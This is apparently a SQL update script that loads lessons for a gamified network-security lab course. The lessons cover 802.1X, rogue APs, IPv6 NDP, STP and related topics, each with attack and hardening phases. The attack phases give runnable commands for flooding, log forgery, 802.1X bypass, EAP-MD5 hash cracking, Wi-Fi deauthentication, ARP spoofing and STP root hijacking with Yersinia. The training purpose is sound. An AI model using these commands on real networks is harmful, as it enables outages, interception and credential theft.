<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">ID Checker — nobody gets a port without showing credentials</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=12 AND phase='build';
UPDATE lab_phases SET title='Log Tampering', content='
<b>Attack 1 — Syslog flood:</b> <code>sudo hping3 --udp -p 514 --flood 192.168.1.1</code> fills the log buffer — real events are dropped. <b>Attack 2 — Forged log entry:</b> <code>logger -n 192.168.1.1 -P 514 "su: admin FAILED LOGIN"</code> — Kali injects fake log entries. <b>Attack 3 — Log overwriting:</b> An attacker who gains CLI access clears the log: <code>clear logging</code>. The evidence is gone. ', is_pro_only=TRUE
WHERE lab_id=33 AND phase='attack';
UPDATE lab_phases SET title='Bypass Port Security', content='
<b>Attack:</b> macof flood + MAC spoofing to exhaust the allowed MACs. Switch port err-disables. Full walkthrough in Lab 03 Attack phase. ', is_pro_only=TRUE
WHERE lab_id=36 AND phase='attack';
UPDATE lab_phases SET title='Bypass the Authenticator', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Three ways past port authentication</h3><p>802.1X is not impenetrable. Three bypass techniques: (1) EAP relay — connect a hub between an authenticated host and the switch, sharing the authenticated session, (2) authentication fallback — if the switch has a guest VLAN or MAB (MAC Authentication Bypass) as fallback, exploit the fallback, (3) RADIUS DoS — flood the RADIUS server to force a fallback to the unauthorized state where some switches fail open.</p></div>

<div class="stats"><span class="chip xp">✦ 600 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~35 min</span><span class="chip loot">⬡ 802.1X bypass · EAP relay · MAB bypass · RADIUS DoS</span></div>

## Objectives

<ul class="objectives">
<li>Use a hub to piggyback on an authenticated host''s session</li>
<li>Exploit MAB fallback (MAC auth bypass) with a spoofed MAC</li>
<li>Flood the RADIUS server to force fail-open behavior</li>
</ul>

## Method 1 — EAP relay (hub attack)

Connect PC1 and Kali to the same hub, then the hub to SW1''s Gi0/1. PC1 authenticates. Kali shares the same port — once the port is authorized, both hosts have network access because 802.1X authenticates the port, not the device.

On Kali:
```
ping 192.168.1.1
```

It works. The switch sees one authenticated session on the port, but the hub passes traffic for both devices.

<div class="callout info"><p><strong>Defense:</strong> Use port-security with <code>maximum 1</code> to prevent multiple MACs on the same 802.1X-authenticated port.</p></div>

## Method 2 — MAB bypass

If the switch has MAB as a fallback (authenticates by MAC address against a whitelist):
```
configure terminal
interface gi0/1
 authentication order dot1x mab
 authentication priority dot1x mab
end
```

Kali can spoof a whitelisted MAC to bypass 802.1X:
```
sudo ip link set dev eth0 down
sudo ip link set dev eth0 address AA:BB:CC:DD:EE:FF
sudo ip link set dev eth0 up
```

If AA:BB:CC:DD:EE:FF is in the MAB whitelist, the switch authorizes the port after the 802.1X timeout.

## Method 3 — RADIUS DoS

Flood the RADIUS server (R1) with authentication requests:
```
sudo hping3 -S -p 1812 --flood 192.168.1.1
```

If the RADIUS server becomes overwhelmed, the switch''s authentication timeout may fail open — granting access to all hosts by default.

Check on SW1:
```
show authentication sessions
show dot1x all summary
```

<div class="boss"><span class="tag">☠ BOSS FIGHT — optional, +250 XP</span><h3>EAP-MD5 hash cracking</h3><p>EAP-MD5 sends a challenge/response hash that can be captured and cracked offline. Set up tcpdump on Kali while PC1 authenticates: <code>sudo tcpdump -i eth0 -X port 1812</code>. Extract the EAP-MD5 challenge + response hash pair and crack it with <code>eapmd5pass</code> or asleap — <code>sudo asleap -r capture.pcap</code>. If the password is weak, you just stole valid credentials.</p></div>

<div class="achievement"><span class="medal">🧪</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">NAC Nemesis — three ways through the authentication wall</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=12 AND phase='attack';
UPDATE lab_phases SET title='Fortify Port Authentication', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Close every bypass</h3><p>Hardened 802.1X: port-security to prevent hub attacks, EAP-TLS (certificate-based) to prevent hash cracking, critical-auth VLAN for RADIUS failure (fail closed, not open), and multi-domain auth to isolate voice/data on the same port.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ EAP-TLS · port-security · critical VLAN · fail closed</span></div>

## Objectives

<ul class="objectives">
<li>Add port-security to prevent hub/EAP relay</li>
<li>Configure critical VLAN to fail CLOSED on RADIUS failure</li>
<li>Deploy EAP-TLS for certificate-based mutual authentication</li>
</ul>

## Step 1 — Port-security to prevent hub attack

On SW1:
```
configure terminal
interface gi0/1
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation shutdown
end
```

Maximum 2 MACs (one for PC, one for voice VLAN). A hub with 3+ devices triggers the violation and err-disables the port.

## Step 2 — Critical VLAN (fail closed)

On SW1:
```
configure terminal
interface gi0/1
 authentication event server dead action authorize vlan 999
 authentication event server alive action reinitialize
end
```

VLAN 999 is a dead-end VLAN with no DHCP, no gateway, no internet. When the RADIUS server is unreachable, the port doesn''t open for business — it goes to a quarantine VLAN.

## Step 3 — EAP-TLS (certificate-based)

On R1 (RADIUS) and clients, use EAP-TLS with PKI. This requires a CA:
```
configure terminal
ip http secure-server
crypto pki server CA
 grant none
crypto pki trustpoint R1
 enrollment url http://192.168.1.1:80
 fqdn R1.netbreakerlab.com
 subject-name CN=R1
 revocation-check crl
 rsakeypair R1 2048
!
crypto pki authenticate R1
crypto pki enroll R1
end
```

EAP-TLS mutual authentication prevents hash capture and replay attacks.

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">NAC Architect — 802.1X that holds firm against relay, fallback, and DoS</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=12 AND phase='harden';
UPDATE lab_phases SET title='Build the Legitimate AP', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Stand up a real wireless network</h3><p>A wireless access point serves an SSID (NetBreaker-WiFi) with WPA2-PSK security. A legitimate client (PC1) connects and browses the internal server. This is the baseline — the network the victim trusts.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ WAP · WPA2-PSK · SSID · wireless client</span></div>

<div class="callout warn"><p>GNS3 wireless lab requires additional images. If native wireless isn''t available, use the <strong>workaround: Ethernet</strong> — treat a switch port as the "AP" and use a wired client. The concepts are identical; only the medium differs.</p></div>

## The topology

| Device | Role | IP |
|---|---|---|
| AP1 | Legitimate WAP | SSID: NetBreaker-WiFi · 192.168.10.1/24 |
| R1 | Gateway + DHCP | 192.168.10.1 (same as AP) |
| PC1 | Wireless client | Connected to NetBreaker-WiFi |
| PC2 | Internal server | 192.168.10.200/24 |
| KALI | Rogue AP | External interface |

## Objectives

<ul class="objectives">
<li>Configure AP1 with WPA2-PSK (password: NetBreakerLab)</li>
<li>Connect PC1 to the legitimate SSID</li>
<li>Verify connectivity to PC2</li>
</ul>

## Step 1 — AP config

On AP1 (or simulated via a switch + router):
```
configure terminal
interface dot11radio0
 ssid NetBreaker-WiFi
 authentication open
 authentication key-management wpa2
 encryption mode ciphers aes-ccm
!
interface gi0/0
 ip address 192.168.10.1 255.255.255.0
 no shutdown
!
ip dhcp pool WIFI
 network 192.168.10.0 255.255.255.0
 default-router 192.168.10.1
end
```

## Step 2 — Client connection

On PC1 (wireless client), connect to NetBreaker-WiFi with password NetBreakerLab. Verify IP:
```
ipconfig /all
```
or on Linux:
```
iwconfig
```

## Step 3 — Verify

From PC1:
```
ping 192.168.10.200
```

The legitimate network works. Note the signal strength, channel, and BSSID (AP''s MAC).

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Signal Lord — you broadcast a wireless network clients trust</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=13 AND phase='build';
UPDATE lab_phases SET title='Kill the Rogue Signal', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Detect and eliminate rogue APs</h3><p>Rogue AP detection: (1) WLC scans for APs with the same SSID but different BSSID, (2) wired-side detection through CDP/LLDP on the uplink port, (3) RSSI anomaly — a stronger signal from a different location, (4) manual wireless site survey. The fix: disable ad-hoc networking, use 802.1X on wired ports to prevent rogue APs from plugging in, and deploy WIPS (Wireless Intrusion Prevention).</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ Rogue AP detection · WIPS · RSSI monitoring</span></div>

## Objectives

<ul class="objectives">
<li>Enable rogue AP detection on the WLC or switch</li>
<li>Use 802.1X on wired switch ports to prevent rogue APs</li>
<li>Deploy manual site survey to identify the rogue signal</li>
</ul>

## Step 1 — Wired-side prevention

The strongest defense: prevent rogue APs from connecting to the wired network via 802.1X on access ports (see Lab 12). If Kali can''t plug into the LAN, her rogue AP has no backhaul — clients connect to her but get no internet.

On SW1 (the port Kali would use):
```
configure terminal
interface gi0/1
 authentication port-control auto
 dot1x pae authenticator
end
```

Without valid 802.1X credentials, Kali''s port stays blocked.

## Step 2 — Wireless rogue detection

If using a Cisco WLC:
```
configure terminal
wireless rogue-ap detection enable
wireless rogue-ap monitor 5
```

The WLC periodically scans all channels for APs. A rogue is detected when an AP broadcasts a known SSID but an unknown BSSID.

Check:
```
show wireless rogue-ap detected
```

## Step 3 — Manual detection with Kali

Use Kali as a detector:
```
sudo airodump-ng wlan0
```

Look for two APs with SSID "NetBreaker-WiFi" but different BSSID/MACs. The one with the inconsistent signal (too strong for its claimed location) is the rogue.

Check the AP''s channel, signal, and encryption capabilites. Real APs usually support all data rates; rogue APs often use minimal rates.

<div class="callout tip"><p><strong>Enterprise defense:</strong> Deploy a WIPS (Wireless IPS) like Cisco MSE, Aruba AWIPS, or open-source Kismet. These correlate AP locations, detect spoofed SSIDs, and can automatically launch countermeasures (deauth against the rogue).</p></div>

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Twin Terminator — you found the clone and cut off its network connection</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=13 AND phase='harden';
UPDATE lab_phases SET title='ARP Cache Poison', content='
<b>Attack:</b> <code>arpspoof -i eth0 -t 192.168.1.1 192.168.1.100</code>. Full Lab 17 Attack. ', is_pro_only=TRUE
WHERE lab_id=38 AND phase='attack';
UPDATE lab_phases SET title='WLAN Recon', content='
<b>Attack 1 — Scanning:</b> <code>sudo airodump-ng wlan0</code>. <b>Attack 2 — Deauth:</b> <code>sudo aireplay-ng -0 5 -a AP_BSSID wlan0</code>. <b>Attack 3 — WPA2 handshake capture:</b> for offline cracking. ', is_pro_only=TRUE
WHERE lab_id=41 AND phase='attack';
UPDATE lab_phases SET title='NETCONF Injection', content='
<b>Attack 1 — XML injection in NETCONF queries:</b> Craft a &lt;edit-config&gt; that modifies the running config. <b>Attack 2 — SSH session hijack:</b> If NETCONF runs over SSH without strict host key checking, MITM the session. ', is_pro_only=TRUE
WHERE lab_id=44 AND phase='attack';
UPDATE lab_phases SET title='Build an IPv6 Island', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>IPv6: the ARP-free neighbourhood</h3><p>IPv6 doesn''t use ARP. Neighbor Discovery Protocol (NDP) replaces it with ICMPv6 Neighbor Solicitations (NS) and Neighbor Advertisements (NA). NDP also handles Router Discovery (RS/RA) — routers announce themselves, and hosts learn the default gateway automatically. This is convenient and trust-based — exactly why it''s exploitable.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ IPv6 · NDP · SLAAC · ICMPv6</span></div>

## The topology

| Device | Role | IPv6 |
|---|---|---|
| R1 | IPv6 router + gateway | 2001:db8:1::1/64 |
| SW1 | L2 switch | transparent |
| PC1 | IPv6 client | SLAAC: 2001:db8:1::100/64 |
| PC2 | Second host | SLAAC: 2001:db8:1::200/64 |
| KALI | Attacker | SLAAC: 2001:db8:1::50/64 |

## Objectives

<ul class="objectives">
<li>Enable IPv6 routing on R1 with SLAAC</li>
<li>Assign IPv6 addresses to all hosts via router advertisements</li>
<li>Verify end-to-end IPv6 connectivity</li>
</ul>

## Step 1 — IPv6 on R1

```
configure terminal
ipv6 unicast-routing
interface gi0/0
 ipv6 address 2001:db8:1::1/64
 ipv6 enable
 no shutdown
end
```

## Step 2 — Verify SLAAC on hosts

On PC1 (Linux):
```
sudo ip -6 addr show
```

Should show an address in 2001:db8:1::/64, typically an EUI-64 or privacy extension address.

From PC1:
```
ping6 2001:db8:1::1
```

Pings R1. Also ping PC2 once it''s connected.

## Step 3 — View NDP cache

On any device:
```
ip -6 neigh show
```

The NDP cache shows IPv6 → MAC mappings, equivalent to ARP table in IPv4.

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">IPv6 Native — you built a network running on the next-gen protocol</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=14 AND phase='build';
UPDATE lab_phases SET title='Secure the Neighbor Discovery', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>RA Guard, SAVI, and secure NDP</h3><p>IPv6 has three main defenses: (1) RA Guard — the switch only accepts RAs from trusted ports (where the real router lives), blocking rogue RAs from access ports, (2) SAVI (Source Address Validation Improvements) — validates source IPs against the binding table, (3) SeND (Secure Neighbor Discovery) — cryptographically signs NDP messages, but is rarely deployed because of complexity.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ RA Guard · SAVI · DHCPv6 guard · binding table</span></div>

## Objectives

<ul class="objectives">
<li>Enable RA Guard on SW1 to block rogue RAs from access ports</li>
<li>Configure DHCPv6 guard to prevent rogue DHCPv6 servers</li>
<li>Verify the attacks are blocked</li>
</ul>

## Step 1 — RA Guard

On SW1:
```
configure terminal
ipv6 nd raguard policy BLOCK_ROGUE
 device-role host
interface gi0/1
 ipv6 nd raguard attach-policy BLOCK_ROGUE
end
```

Gi0/1 is the port Kali is connected to. Device-role "host" means the switch will drop any Router Advertisements received on this port.

Gi0/0 (connecting to R1) should be trusted:
```
interface gi0/0
 ipv6 nd raguard attach-policy BLOCK_ROGUE
end
```

Wait — that needs a different policy for the trusted port. Instead:
```
interface gi0/0
 no ipv6 nd raguard attach-policy
end
```

By default, trunk/uplink ports are trusted.

## Step 2 — Verify

On Kali, re-run the RA flood attack. Check SW1:
```
show ipv6 nd raguard interface gi0/1
show ipv6 nd raguard statistics
```

Rogue RAs from Kali are counted in the dropped counter.

## Step 3 — DHCPv6 guard

Prevents rogue DHCPv6 servers:
```
configure terminal
ipv6 dhcp guard policy BLOCK_DHCP
 device-role client
interface gi0/1
 ipv6 dhcp guard attach-policy BLOCK_DHCP
end
```

## Step 4 — IPv6 first-hop security bundle

Cisco''s IPv6 First-Hop Security combines all features:
```
configure terminal
ipv6 source-guard policy SECURE
 deny global-autoconf
interface gi0/1
 ipv6 source-guard attach-policy SECURE
end
```

<div class="callout info"><p><strong>Key takeaway:</strong> IPv6 is not inherently more secure than IPv4 — it replaces ARP with NDP which has the same trust model. The defenses (RA Guard, SAVI, DHCPv6 Guard) are equivalent to DHCP Snooping + DAI in IPv4. Without them, IPv6 networks are just as vulnerable.</p></div>

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">IPv6 Warden — Neighbor Discovery is no longer a free-for-all</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=14 AND phase='harden';
UPDATE lab_phases SET title='Transfer IOS Images', content='
<b>Step 1</b> — On Kali: <code>sudo atftpd --daemon --bind-address 192.168.1.100 /tftpboot</code>. <b>Step 2</b> — On R1: <code>copy running-config tftp://192.168.1.100/r1-config</code>. <b>Step 3</b> — Verify: Kali receives the config. ', is_pro_only=FALSE
WHERE lab_id=34 AND phase='build';
UPDATE lab_phases SET title='Secure Every Port', content='
<b>Standalone summary:</b> Port security limits MACs per port. <code>switchport port-security maximum 1</code> + <code>violation shutdown</code>. Full walkthrough in Lab 03 (MAC Flood Chaos — Harden phase). ', is_pro_only=FALSE
WHERE lab_id=36 AND phase='build';
UPDATE lab_phases SET title='DHCP Snooping Basics', content='
<b>Standalone:</b> <code>ip dhcp snooping vlan 1</code> + <code>int gi0/24</code> → <code>ip dhcp snooping trust</code>. Full Lab 08. ', is_pro_only=FALSE
WHERE lab_id=37 AND phase='build';
UPDATE lab_phases SET title='Deploy a Virtual Switch', content='
<b>Simulated in GNS3:</b> Create a VIRL/IOL L2 switch as a VM. <b>Step 1</b> — Configure VLANs, trunk, and verify it behaves identically to a physical switch. <b>Step 2</b> — Create a management interface: <code>interface vlan 1</code> → <code>ip address 192.168.1.10/24</code>. <b>Step 3</b> — Compare performance: physical vs virtual. ', is_pro_only=FALSE
WHERE lab_id=40 AND phase='build';
UPDATE lab_phases SET title='Lightweight AP + WLC', content='
<b>Step 1</b> — WLC config: <code>interface gi0/0</code> → <code>ip address 10.0.0.1/24</code>. <b>Step 2</b> — AP joins WLC via CAPWAP. <b>Step 3</b> — WLC pushes config to AP automatically. ', is_pro_only=FALSE
WHERE lab_id=42 AND phase='build';
UPDATE lab_phases SET title='Interact with REST APIs', content='
<b>Step 1</b> — Enable NETCONF: <code>netconf-yang</code>. <b>Step 2</b> — From Kali: <code>ssh admin@192.168.1.1 -p 830 -s netconf</code> → send XML for &lt;get-config&gt;. ', is_pro_only=FALSE
WHERE lab_id=44 AND phase='build';
UPDATE lab_phases SET title='Deploy Standard ACLs', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Filter traffic by source IP</h3><p>Standard ACLs (1–99, 1300–1999) match ONLY on source IP. They''re applied closest to the destination (outbound) because they can''t distinguish between traffic to different destinations.</p></div>
<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ Standard ACL · permit/deny · wildcard mask</span></div>
<b>Topology:</b> R1 with two LANs + one WAN. PC1 + PC2 on different subnets. <b>Step 1</b> — Create ACL: <code>access-list 10 permit 192.168.1.0 0.0.0.255</code> → <code>access-list 10 deny any</code>. <b>Step 2</b> — Apply outbound on gi0/1: <code>int gi0/1</code> → <code>ip access-group 10 out</code>. <b>Step 3</b> — Verify: PC1 (192.168.1.x) passes, Kali (172.16.x.x) blocked. <code>show access-lists 10</code> shows hit counts.
<div class="achievement"><span class="medal">🏗️</span><span class="txt">Achievement: ACL Initiate</span></div>
', is_pro_only=FALSE
WHERE lab_id=30 AND phase='build';
UPDATE lab_phases SET title='Syslog Security', content='
<b>Step 1</b> — Log buffer size: <code>logging buffered 65536</code>. <b>Step 2</b> — Timestamps: <code>service timestamps log datetime msec show-timezone</code>. <b>Step 3</b> — Secure syslog with crypto: use <code>logging host 192.168.1.100 transport tcp port 6514</code> (syslog over TLS). ', is_pro_only=TRUE
WHERE lab_id=33 AND phase='harden';
UPDATE lab_phases SET title='Secure File Transfers', content='
<b>Step 1</b> — Use SCP instead of TFTP: <code>ip scp server enable</code>. <b>Step 2</b> — TFTP restricted by ACL: <code>access-list 10 permit host 192.168.1.200</code> → TFTP server bound to that ACL. <b>Step 3</b> — Verify IOS image integrity: <code>verify /md5 flash:image.bin</code>. ', is_pro_only=TRUE
WHERE lab_id=34 AND phase='harden';
UPDATE lab_phases SET title='Port Security Best Practice', content='
<b>Step 1:</b> <code>sticky</code> MAC, <code>maximum 1</code>, <code>violation restrict</code> (drops but doesn''t shut), <code>errdisable recovery cause psecure-violation</code>. ', is_pro_only=TRUE
WHERE lab_id=36 AND phase='harden';
UPDATE lab_phases SET title='Hardening', content='
<b>Step 1:</b> <code>ip dhcp snooping limit rate 5</code>. <b>Step 2:</b> DHCP snooping binding database. ', is_pro_only=TRUE
WHERE lab_id=37 AND phase='harden';
UPDATE lab_phases SET title='DAI Validation', content='
<b>Step 1:</b> <code>ip arp inspection validate src-mac dst-mac ip</code>. <b>Step 2:</b> <code>show ip arp inspection statistics</code>. ', is_pro_only=TRUE
WHERE lab_id=38 AND phase='harden';
UPDATE lab_phases SET title='Hypervisor Security', content='
<b>Step 1</b> — VLAN per tenant (no shared VLANs). <b>Step 2</b> — Rate-limit per VM: <code>srr-queue bandwidth limit 50</code>. <b>Step 3</b> — Separate management network. ', is_pro_only=TRUE
WHERE lab_id=40 AND phase='harden';
UPDATE lab_phases SET title='Build the Loop', content='
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 1 of 3</span>
<h3>Build the Loop</h3>
<p>Redundant links stop a single cable failure from taking down the building. But redundant links between switches also create a <strong>loop</strong> — and an Ethernet frame with nowhere to expire will circle a loop forever, doubling every time it hits a branch, until the network drowns in its own traffic. Spanning Tree Protocol''s whole job is to find that loop and surgically block one link before it happens.</p>
<p>You''re wiring three switches in a triangle — SW1, SW2, SW3 — with SW1 elected root bridge. Then, same trick as always: you''ll leave the election process trusting anyone who shows up with a better offer.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 550 XP</span>
<span class="chip diff">◆ Difficulty: ★★☆☆☆</span>
<span class="chip time">◷ ~20 min</span>
<span class="chip loot">⚿ Loot: STP root election · BPDUs · port roles &amp; states</span>
</div>

## Your arsenal (GNS3)

| Device | Role |
|---|---|
| SW1, SW2, SW3 | Triangle topology — the loop STP has to tame |
| PC1 | Ordinary host on SW1 |
| KALI | Plugged into SW3 |

Wire it: `SW1↔SW2`, `SW2↔SW3`, `SW3↔SW1` — a full triangle — plus `PC1→SW1 Fa0/1` and `KALI→SW3 Fa0/2`.

<ul class="objectives">
<li>Trunk all three inter-switch links</li>
<li>Leave every switch at the default STP priority (this is the trap)</li>
<li>Confirm STP blocks exactly one port to break the loop</li>
<li>Confirm PC1 can reach the network with no broadcast storm</li>
</ul>

## Step 1 — Wire the triangle

On **all three switches**, trunk the inter-switch links:

```
enable
configure terminal
interface range FastEthernet0/1 - 2
 switchport trunk encapsulation dot1q
 switchport mode trunk
end
```
<div class="callout info">
<p>Yes — a real loop, on purpose. This is the whole point of STP: without it, this triangle would broadcast-storm itself into a coma within seconds.</p>
</div>

## Step 2 — Do absolutely nothing else

This is the trap. Cisco''s default STP priority is <code>32768</code> on every switch, and root bridge election goes to whoever has the **lowest** Bridge ID (priority + MAC address) — lowest MAC wins any tie. Nobody configured a preferred root. The election is a coin flip decided by whichever switch happens to have the lowest MAC address:

```
show spanning-tree vlan 1
```
Note whichever switch won — call it your **current root**. Nobody chose it. It just happened to have the smallest MAC address in the room. That''s a network running on luck, not design — exactly the setup you''ll find in a lot of real small-business networks.

## Step 3 — Confirm the loop is actually being tamed

```
show spanning-tree vlan 1
```
On the non-root switches, exactly **one** of the two uplink ports should show <code>BLK</code> (blocking) — that''s STP breaking the loop by refusing to forward on the redundant path. The other stays <code>FWD</code>.

<div class="callout tip">
<p>Find that blocked port on the switch that ISN''T root. If both your inter-switch ports say <code>FWD</code>, you have a real loop and things are about to get loud — go back and check the trunk configs.</p>
</div>

## Step 4 — Sanity check

```
ping <PC1-address-from-SW1-side>   ! from anywhere on the topology — should work fine, one path only
```

<div class="achievement">
<span class="medal">🔺</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Triangle Tamer — three switches, one loop, zero broadcast storms</span></span>
</div>

**Next:** the current root bridge got that title by accident. Phase 2 is where you take it by force.
', is_pro_only=FALSE
WHERE lab_id=2 AND phase='build';
UPDATE lab_phases SET title='Steal the Crown', content='
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 2 of 3</span>
<h3>Steal the Crown</h3>
<p>STP elects a root bridge by asking every switch to broadcast a BPDU (Bridge Protocol Data Unit) announcing its Bridge ID. Lowest ID wins. Nothing checks whether the sender is actually a switch. Your Kali box can send BPDUs too — and if it claims a lower priority than anyone else in the room, every switch will believe it, recompute the entire spanning tree around your laptop, and start routing traffic through a link that ends at your NIC.</p>
</div>

<div class="callout danger">
<p><strong>Rules of engagement:</strong> every command here runs against <strong>your own GNS3 lab</strong>. This attack can black-hole a real production network in seconds — never point it anywhere you don''t own.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 750 XP</span>
<span class="chip diff">◆ Difficulty: ★★★☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: BPDU spoofing · root-bridge hijack · STP topology-change abuse</span>
</div>

## Step 1 — Watch the current election

Before you touch anything, capture what a legitimate BPDU looks like:

```
sudo tcpdump -i eth0 -e stp -c 5
```
You''ll see BPDUs arriving every 2 seconds (the default Hello timer) advertising the current root''s Bridge ID. That cadence, and the fact that anyone can join it, is the whole vulnerability.

## Step 2 — Claim the crown (Yersinia)

```
sudo yersinia -G
```
In the window: **Launch attack → STP → "Claiming Root Role."** Yersinia now announces a BPDU with priority <code>0</code> — lower than any default-priority switch could ever offer — and keeps refreshing it every 2 seconds so it never ages out.

Prefer the terminal?
```
sudo yersinia -I
# press  g  → choose STP
# press  x  → choose  1) Claiming Root Role
```

## Step 3 — Watch the network bow to you

Give it a few seconds, then check any switch:

```
show spanning-tree vlan 1
```

<div class="callout tip">
<p><strong>💥 That''s the moment.</strong> <code>Root ID</code> now shows YOUR Kali box''s fake Bridge ID. Every switch just recalculated its port roles around a laptop that isn''t even a switch. Depending on the topology, a previously-blocked port may now be forwarding, or vice versa — the traffic pattern across your triangle has physically changed because you asked nicely.</p>
</div>

Confirm from the other side — SW3''s port toward Kali should now show as a **designated** or **root** port instead of whatever it was before:
```
show spanning-tree vlan 1 interface fastEthernet 0/2
```

<div class="achievement">
<span class="medal">👑</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Crown Thief — you out-elected every real switch on the network</span></span>
</div>

<div class="boss">
<span class="tag">☠ BOSS FIGHT — optional, +300 XP</span>
<h3>Topology Change flood: force constant recalculation</h3>
<p>Winning the election once is loud but stable. The sneakier move is repeatedly triggering <strong>Topology Change Notifications (TCNs)</strong> — every recalculation flushes every switch''s MAC address table early, forcing a flood-and-relearn cycle on every port in the network. Do this continuously and you get a low-grade, hard-to-diagnose slowdown across the whole LAN, not an obvious outage.</p>
</div>

```
sudo yersinia -G
# Launch attack → STP → "Conf/TCN BPDU Flooding"
```

Watch a switch''s MAC table get wiped and relearn on a timer that shouldn''t exist:

```
show mac address-table count
! run it twice a few seconds apart while the flood runs — count resets periodically
```

<div class="achievement">
<span class="medal">🌪️</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Chaos Agent — nothing crashed, everything just quietly got worse</span></span>
</div>

**Next:** Phase 3 — nail down who''s actually allowed to be root, and make sure a laptop can never win that argument again.
', is_pro_only=FALSE
WHERE lab_id=2 AND phase='attack';
UPDATE lab_phases SET title='Crown the Right King', content='
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 3 of 3</span>
<h3>Crown the Right King</h3>
<p>The root election had no rules, so anyone could win it — including your laptop. Fix that two ways: <strong>choose your root on purpose</strong> instead of leaving it to chance, and <strong>refuse to listen</strong> to BPDUs from ports that have no business sending them in the first place.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 800 XP</span>
<span class="chip diff">◆ Difficulty: ★★★☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: root primary/secondary · BPDU Guard · Root Guard</span>
</div>

<ul class="objectives">
<li>Explicitly set SW1 as root, SW2 as secondary root</li>
<li>Enable BPDU Guard on every access port (kills Kali''s ability to speak STP at all)</li>
<li>Enable Root Guard on switch-facing ports where a rogue root claim shouldn''t be trusted</li>
<li>Re-run both attacks → both fail</li>
</ul>

## Fix 1 — Pick your root on purpose

Stop leaving the crown to whichever MAC address happens to be lowest. On **SW1** (your intended permanent root):

```
configure terminal
spanning-tree vlan 1 root primary
end
```

On **SW2** (your backup, in case SW1 ever goes down):

```
configure terminal
spanning-tree vlan 1 root secondary
end
```

`root primary` sets SW1''s priority to 24576 (or lower still if needed to beat every other bridge) — comfortably below the default 32768, but crucially, still something Yersinia''s priority-0 claim would have beaten. Priority alone doesn''t stop a determined attacker. That''s what Fix 2 is for.

## Fix 2 — BPDU Guard: silence access ports completely

Real end hosts have **no reason** to ever send a BPDU. BPDU Guard shuts a port down the instant it hears one — no negotiation, no "let''s see who wins":

```
configure terminal
interface FastEthernet0/2
 description KALI-ACCESS-PORT
 spanning-tree bpduguard enable
end
```
<div class="callout tip">
<p>Even better at scale: <code>spanning-tree portfast bpduguard default</code> in global config enables BPDU Guard automatically on every PortFast-enabled access port, so you never have to remember it per-interface.</p>
</div>

## Fix 3 — Root Guard: protect the switch-facing links too

BPDU Guard is for host ports. But what about a link to another switch that should NEVER become root — say, a link to a branch office switch you don''t fully trust? Root Guard blocks the port (not the whole switch) if it ever hears a superior BPDU from that direction:

```
configure terminal
interface FastEthernet0/1
 spanning-tree guard root
end
```

## Re-run the attack (the fun part)

```
sudo yersinia -G      # Launch attack → STP → Claiming Root Role
```

Check the port you protected:
```
show spanning-tree vlan 1 interface fastEthernet 0/2
```

<div class="callout tip">
<p><code>Status: err-disabled</code>. BPDU Guard didn''t argue about priorities — it just shut the port the instant a BPDU showed up where one should never exist. Your fake root claim never even reaches the election.</p>
</div>

To bring the port back after testing (in production, this should require a human to look first):
```
configure terminal
interface FastEthernet0/2
 shutdown
 no shutdown
end
```

## Prove it to the grader

```
show spanning-tree vlan 1                      ! Root ID is SW1, exactly as intended
show spanning-tree summary                       ! BPDU Guard + Root Guard both active
show interfaces status err-disabled              ! Kali''s port, shut by BPDU Guard
```

<div class="achievement">
<span class="medal">🛡️</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Rightful King — the crown stays exactly where you put it</span></span>
</div>

